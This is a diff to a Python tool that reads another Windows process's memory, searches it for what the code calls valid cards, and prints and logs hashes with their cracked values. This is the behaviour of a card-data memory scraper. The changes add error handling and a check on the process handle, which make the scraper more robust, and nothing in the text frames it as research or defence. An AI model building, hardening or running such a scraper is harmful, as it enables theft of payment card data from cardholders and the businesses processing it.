@@ -111,9 +111,11 @@ def memory_scan_worker(process_handle):
             continue
         
         base_addr, size = memory_queue.get()
+        
         try:
             buffer = ctypes.create_string_buffer(size)
             bytesRead = ctypes.c_size_t(0)
+            # Check if the address is still valid and if we can read memory
             if ctypes.windll.kernel32.ReadProcessMemory(process_handle, ctypes.c_void_p(base_addr), buffer, size, ctypes.byref(bytesRead)):
                 valid_cards = scan_memory_chunk(buffer.raw.decode('latin-1', errors='ignore'))
                 if valid_cards:
@@ -126,6 +128,9 @@ def memory_scan_worker(process_handle):
                             formatted_output = f"Hash Found: {card['Hash']} - Cracked Value: {card['Cracked Value']}"
                             print(formatted_output)
                             logging.info(formatted_output)  # Log to file
+            else:
+                # Handle the case where ReadProcessMemory fails
+                logging.warning(f"Failed to read memory at {base_addr}: Address may not be valid or accessible.")
         except Exception as e:
             logging.error(f"Error reading memory at {base_addr}: {e}")
         finally:
@@ -171,11 +176,12 @@ def scan_process_memory(pid, num_threads=4):
         print(f"No valid memory regions found for PID {pid}")
         return
 
-    for region in memory_regions:
-        memory_queue.put(region)
-
     process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
+    if not process_handle:
+        logging.error(f"Could not open process with PID {pid}.")
+        return
 
+    # Start threads
     threads = []
     for _ in range(num_threads):
         t = threading.Thread(target=memory_scan_worker, args=(process_handle,))
